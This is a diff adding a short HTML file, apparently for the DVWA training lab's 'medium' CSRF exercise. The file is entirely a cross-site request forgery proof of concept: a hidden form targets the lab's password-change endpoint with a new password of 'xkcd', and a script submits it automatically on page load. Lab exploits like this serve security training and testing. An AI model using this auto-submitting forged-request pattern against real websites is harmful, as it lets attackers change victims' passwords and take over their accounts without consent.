@@ -1,0 +1,15 @@
+<!--
+http://localhost/dvwa/csrf/127.0.0.1/medium.html
+-->
+
+<form name="frmCSRF" action="http://localhost/dvwa/vulnerabilities/csrf/">
+	<input type="hidden" name="Change" value="true" />
+	<input type="hidden" name="password_new" value="xkcd" />
+	<input type="hidden" name="password_conf" value="xkcd" />
+</form>
+
+<script type="text/javascript">
+	document.body.onload = function() {
+		document.frmCSRF.submit();
+	}
+</script>
